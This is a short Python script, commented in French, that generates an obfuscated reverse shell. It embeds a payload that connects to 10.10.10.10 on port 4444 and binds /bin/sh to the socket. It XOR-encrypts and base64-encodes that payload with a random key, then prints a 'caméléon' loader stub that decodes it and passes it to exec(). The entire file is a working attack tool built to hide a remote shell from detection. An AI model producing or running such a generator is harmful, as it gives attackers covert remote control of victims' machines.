import base64
import random

# ========= CONFIG =========
ip = "10.10.10.10"
port = 4444
key = random.randint(1, 255)  # clé XOR aléatoire
# ==========================

# Payload (reverse shell) à chiffrer
payload = f"""
import socket,subprocess,os
s=socket.socket()
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""

# Fonction de chiffrement XOR
def xor_encrypt(data, key):
    return bytearray([b ^ key for b in data.encode()])

# Encode le payload
encoded = xor_encrypt(payload, key)
encoded_b64 = base64.b64encode(encoded).decode()

# Génère le caméléon (stub + payload)
print("### SHELL CAMÉLÉON ###\n")
print("import base64\n")
print(f"key = {key}")
print(f"encoded = \"{encoded_b64}\"\n")
print("""
decoded = base64.b64decode(encoded)
decrypted = bytearray([b ^ key for b in decoded])
exec(decrypted.decode())
""")
